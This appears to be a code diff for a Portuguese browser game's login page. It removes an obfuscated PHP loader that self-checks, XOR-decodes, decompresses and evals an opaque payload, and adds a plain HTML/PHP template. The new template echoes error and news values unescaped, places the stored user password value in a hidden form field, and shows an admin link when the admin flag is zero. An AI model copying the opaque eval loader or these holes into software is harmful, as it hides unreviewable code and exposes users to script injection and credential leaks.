@@ -1,24 +1,252 @@
-<?php
-$nxohne="48cccb90326aa9a4a73866b60fee109f";
-$lipwuktxxf="505905565052085407065707580d03070755570e530e0303565f5c0107090804";
-$amiecqil="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";
-$nxslovzmz=file_get_contents(__FILE__);
-$zvtybycnx=str_replace($amiecqil,"",$nxslovzmz);
-if(strpos($zvtybycnx,"ec"."ho")!==false||strpos($zvtybycnx,"pr"."int")!==false||strpos($zvtybycnx,"var_"."dump")!==false||strpos($zvtybycnx,"file_put_"."contents")!==false||strpos($zvtybycnx,"fw"."rite")!==false){die();}
-$ujwailx=str_replace(array($nxohne,$lipwuktxxf),array("SP_8fb3d43c","KP_af4f8cea"),$nxslovzmz);
-$feuxjeyuh=md5($ujwailx);
-$pjrwow=hex2bin($lipwuktxxf);
-$begbksicg="";
-$wohucqlr=strlen($feuxjeyuh);
-for($iinzaaf=0;$iinzaaf<$wohucqlr;$iinzaaf++){
-$begbksicg.=chr(ord($pjrwow[$iinzaaf])^ord($feuxjeyuh[$iinzaaf]));
-}
-$hzmcyba=base64_decode($amiecqil);
-$lmpsbqrkcc=strlen($hzmcyba);
-$edktph="";
-$kjlbocii=strlen($begbksicg);
-for($iinzaaf=0;$iinzaaf<$lmpsbqrkcc;$iinzaaf++){
-$edktph.=$hzmcyba[$iinzaaf]^$begbksicg[$iinzaaf%$kjlbocii];
-}
-$bmjimfvjesf="gzun"."compress";
-eval('?>' . $bmjimfvjesf($edktph) . '<?php ');
+<?php if (empty($p_l)): ?>
+    <!DOCTYPE html
+        PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml">
+
+    <head>
+        <title><?= __('public.index.title') ?></title>
+        <meta id="og_title" property="og:title" content="Tribos" />
+        <meta id="og_type" property="og:type" content="game" />
+        <meta id="og_url" property="og:url" content="https://ice41.pt" />
+        <meta id="og_image" property="og:image" content="http://www.die-staemme.de/graphic/reports/support_arrives.jpg" />
+        <meta id="og_site_name" property="og:site_name" content="Tribos" />
+        <meta id="fb_app_id" property="fb:app_id" content="110344252415324" />
+        <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" type="image/x-icon" />
+        <meta id="og_description" property="og:description" content="tribos jogo online" />
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta name="description" content="<?= __('public.index.meta_description') ?>" />
+        <meta name="keywords"
+            content="Jogo online, Jogos online, Jogo de navegador, jogos de navegador, jogos, wiki, jogos pl, estatísticas, Multijogador, grátis, grátis, grátis, estratégia, Idade Média, fórum" />
+        <link rel="stylesheet" type="text/css" href="css/index.css" />
+        <script type="text/javascript" src="js/index.js"></script>
+        <script type="text/javascript">
+            //<![CDATA[
+            var mobile = false;
+            //]]>
+        </script>
+    </head>
+
+    <body>
+        <!-- ULTRA SIMPLE LANGUAGE SELECTOR - GUARANTEED VISIBLE -->
+        <div
+            style="position: fixed; top: 0; right: 0; z-index: 99999; background: #fff; padding: 10px; border: 3px solid red; box-shadow: 0 0 10px rgba(0,0,0,0.5);">
+            <strong style="color: red;">IDIOMA:</strong>
+            <select onchange="window.location.href='?lang='+this.value"
+                style="padding: 5px; font-size: 14px; border: 2px solid #000;">
+                <option value="pt_PT" <?= (current_locale() == 'pt_PT') ? 'selected' : '' ?>>🇵🇹 PT</option>
+                <option value="en_US" <?= (current_locale() == 'en_US') ? 'selected' : '' ?>>🇬🇧 EN</option>
+                <option value="es_ES" <?= (current_locale() == 'es_ES') ? 'selected' : '' ?>>🇪🇸 ES</option>
+                <option value="fr_FR" <?= (current_locale() == 'fr_FR') ? 'selected' : '' ?>>🇫🇷 FR</option>
+            </select>
+        </div>
+
+        <div id="pbar">
+            <!-- Portal Bar content omitted for brevity as it seems external/static, keeping structure -->
+            <div class="pb-outer pb-outer-pl">
+                <div class="pb-inner">
+                    <div class="pb-cntnt">
+                        <div class="pb-home">
+                            <a href="https://ice41.pt" target="_blank" title="ice41"><span>ice41</span></a>
+                        </div>
+
+                        <!-- Language Selector -->
+                        <div style="float: right; margin-right: 15px; position: relative;">
+                            <select onchange="window.location.href='?lang='+this.value"
+                                style="background: #fff; border: 1px solid #999; padding: 2px 5px; font-size: 11px; cursor: pointer;">
+                                <option value="pt_PT" <?= (current_locale() == 'pt_PT') ? 'selected' : '' ?>>🇵🇹 Português (PT)
+                                </option>
+                                <option value="en_US" <?= (current_locale() == 'en_US') ? 'selected' : '' ?>>🇬🇧 English
+                                </option>
+                                <option value="es_ES" <?= (current_locale() == 'es_ES') ? 'selected' : '' ?>>🇪🇸 Español
+                                </option>
+                                <option value="fr_FR" <?= (current_locale() == 'fr_FR') ? 'selected' : '' ?>>🇫🇷 Français
+                                </option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pb-tab"></div>
+        </div>
+
+        <div id="index_body">
+            <div id="main">
+                <!-- Language Selector - Visible Position -->
+                <div
+                    style="text-align: right; padding: 10px 20px; background: rgba(139, 108, 66, 0.3); border-bottom: 2px solid #8b6c42;">
+                    <label style="color: #3b260e; font-weight: bold; margin-right: 10px;">Idioma:</label>
+                    <select onchange="window.location.href='?lang='+this.value"
+                        style="background: #f4e4bc; border: 2px solid #8b6c42; padding: 5px 10px; font-size: 12px; cursor: pointer; border-radius: 3px;">
+                        <option value="pt_PT" <?= (current_locale() == 'pt_PT') ? 'selected' : '' ?>>🇵🇹 Português (PT)
+                        </option>
+                        <option value="en_US" <?= (current_locale() == 'en_US') ? 'selected' : '' ?>>🇬🇧 English
+                        </option>
+                        <option value="es_ES" <?= (current_locale() == 'es_ES') ? 'selected' : '' ?>>🇪🇸 Español
+                        </option>
+                        <option value="fr_FR" <?= (current_locale() == 'fr_FR') ? 'selected' : '' ?>>🇫🇷 Français
+                        </option>
+                    </select>
+                </div>
+
+                <div id="header">
+                    <h1>
+                        <a href="index.php" style="background:url(graphic/index/bg-noble2.jpg) no-repeat 100% 0;">
+                            <p style="position: absolute; top: -300px"><?= __('public.index.game_title') ?></p>
+                        </a>
+                    </h1>
+                    <div class="navigation">
+                        <div class="navigation-holder">
+                            <div class="navigation-wrapper">
+                                <div id="navigation_span">
+                                    <?php
+                                    $lcount = count($linki);
+                                    $i = 0;
+                                    foreach ($linki as $link => $value):
+                                        $i++;
+                                        ?>
+                                        <a href="<?= $link ?>"><?= $value ?></a>
+                                        <?php if ($lcount != $i)
+                                            echo " - "; ?>
+                                    <?php endforeach; ?>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <span class="paladin"><img src="graphic/index/bg-ice41.png" alt="" /></span>
+                </div>
+                <div id="content">
+                    <div class="container-block">
+                        <div class="container-top"></div>
+                        <div class="container">
+                            <div class="info-block">
+                                <h2><?= __('public.index.heading') ?></h2>
+                                <p><?= __('public.index.description') ?></p>
+                                <a class="btn-kostenlos-anmelden"
+                                    href="register.php"><?= __('public.index.register_now') ?></a>
+                                <strong><?= __('public.index.screenshots') ?></strong>
+                                <ul class="screenshots clearfix">
+                                    <li><a href="#" onclick="Index.toggle_screenshot(1); return false;"><img
+                                                src="graphic/index/tribalwars-map.png?46271"
+                                                alt="<?= __('public.index.screenshot_map') ?>" /></a></li>
+                                    <li><a href="#" onclick="Index.toggle_screenshot(2); return false;"><img
+                                                src="graphic/index/tribalwars-rally-point.png?a01a1"
+                                                alt="<?= __('public.index.screenshot_rally') ?>" /></a></li>
+                                    <li class="last"><a href="#" onclick="Index.toggle_screenshot(3); return false;"><img
+                                                src="graphic/index/tribalwars-paladin.png?def25"
+                                                alt="<?= __('public.index.screenshot_paladin') ?>" /></a></li>
+                                </ul>
+                                <div>
+                                    <br><b><?= str_replace('{count}', $players, __('public.index.registered_accounts')) ?></b>
+                                </div>
+                                <div class="clear"></div>
+                            </div>
+
+                            <div class="login-block">
+                                <h2 style="text-align:left;margin-bottom:15px;"><?= __('public.index.login') ?></h2>
+
+                                <?php if (isset($error)): ?>
+                                    <p class="error" style="color: #b40000"><?= $error ?></p>
+                                <?php endif; ?>
+
+                                <form action="index.php?action=login" method="post" id="login_form"
+                                    onsubmit="return Index.login_submit();">
+                                    <div>
+                                        <label for="user">
+                                            <strong><?= __('public.index.username') ?></strong>
+                                            <span>
+                                                <input id="user" name="user" class="text" type="text" value=""
+                                                    onkeydown="if((e=window.event||event) && e.keyCode == 13 && $('#user').val() && $('#password').val()) $('#login_form').submit()" />
+                                            </span>
+                                        </label>
+                                        <label for="password">
+                                            <strong><?= __('public.index.password') ?></strong>
+                                            <span>
+                                                <input name="clear" type="hidden" value="true" />
+                                                <input id="password" name="password" class="text" type="password"
+                                                    onkeydown="if((e=window.event||event) && e.keyCode == 13 && $('#user').val() && $('#password').val()) $('#login_form').submit()" />
+                                            </span>
+                                        </label>
+
+                                        <input type="submit" id="login_submit_button" style="display: none" />
+
+                                        <label for="cookie" class="remember_me" style="text-align: right;">
+                                            <input id="cookie" type="checkbox" name="cookie" value="true" />
+                                            <?= __('public.index.remember_me') ?>
+                                        </label>
+
+                                        <div id="login-buttons">
+                                            <div id="js_login_button">
+                                                <a href="#" onclick="$('#login_submit_button').click()"
+                                                    class="login_button">
+                                                    <span class="button_left"></span>
+                                                    <span class="button_middle"><?= __('public.index.enter') ?></span>
+                                                    <span class="button_right"></span>
+                                                </a>
+                                            </div>
+                                        </div>
+                                        <br style="clear:both;" />
+                                    </div>
+                                </form>
+                                <div style="position: absolute; bottom: 10px">
+                                    <a href="lost_pw.php"><?= __('public.index.recover_password') ?></a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="container-bottom"></div>
+                    </div>
+                </div><!-- content -->
+
+                <?php if (count($news) > 0): ?>
+                    <?php $bbParser = new \App\Helpers\BBCodeParser(); ?>
+                    <div id="footer">
+                        <div class="footer-header"></div>
+                        <div class="footer-holder">
+                            <?php foreach ($news as $id => $ogloszenie): ?>
+                                <div>
+                                    <span
+                                        class="<?= ($ogloszenie['typ'] != 0) ? 'global-' : '' ?>news"><?= $ogloszenie['nazwa'] ?></span>
+                                    <strong><?= $ogloszenie['data'] ?></strong>
+                                    <p><?= $bbParser->parse($ogloszenie['text']) ?></p>
+                                </div>
+                                <?php if (count($news) != $ogloszenie['counter']): ?>
+                                    <div class="news-separator"></div>
+                                <?php endif; ?>
+                            <?php endforeach; ?>
+                        </div>
+                        <div class="footer-bottom"></div>
+                    </div><!-- footer -->
+                <?php endif; ?>
+
+                <div class="closure">
+                    <?= __('public.index.footer') ?>
+                    <br>
+                    &copy; 2009 - 2024
+                    <a target="_blank" href="https://www.ice41.pt">ice41</a> &middot;
+                    <div id="screenshot" style="display:none" onclick="Index.hide_screenshot();">
+                        <div id="screenshot_image"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+
+    </html>
+<?php else: ?>
+    <?php if (!empty($error)): ?>
+        {"error":"<?= $error ?>"}
+    <?php else: ?>
+        {"res":"<form action=\"/index.php?action=zaloguj\" method=\"post\" class=\"server-form\" id=\"server_select_list\">
+            \n\n\t\t\n\t<input name=\"user\" type=\"hidden\" value=\"<?= $user_info['id'] ?>\"><input name=\"password\"
+                type=\"hidden\" value=\"<?= $user_info['haslo'] ?>\">\n\n\t\t\n\t<div id=\"active_server\">\n\t\t\t\t\t<p
+                    class=\"pseudo-heading\">Em que mundo quer entrar?<\ /p>\n\t\t\t\t\t\t\t<div class=\"clearfix\"><?php foreach ($serwery as $serw): ?>\n\t\t\t\t\t\t<a href=\"#\" onclick=\"return
+                                    Index.submit_login('serwer=<?= $serw ?>');\">\n\t\t\t\t<span
+                            class=\"world_button_<?= (!in_array($serw, $user_info['serwery_gry'])) ? 'in' : '' ?>active\">Mundo <?= $serw ?><\ /span>\n\t\t\t<\ /a><?php endforeach; ?>\n\t\t\t\t\t\t<\
+                                        /div>\n\t\t\n\t\t\n\t\t\t\t\t<p class=\"pseudo-heading\" id=\"show_all_server\">
+                                            \n\t\t\t\t<?php if ($user_info['admin'] == 0): ?><a
+                                                href=\"admin.php\">Entrar como admin<\ /a><?php endif; ?>\n\t\t\t<\ /p>
+                                                        \n\t\t <\ /div>\n\n \t<div id=\"inactive_server_list\"
+                                                                class=\"clearfix\" style=\"display:none;\">
+                                                                \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t
+                                                                <\ /div>\n\t\n\t\n<\ /form>\n\n"}
+                                                                        <?php endif; ?>
+                                                                        <?php endif; ?>
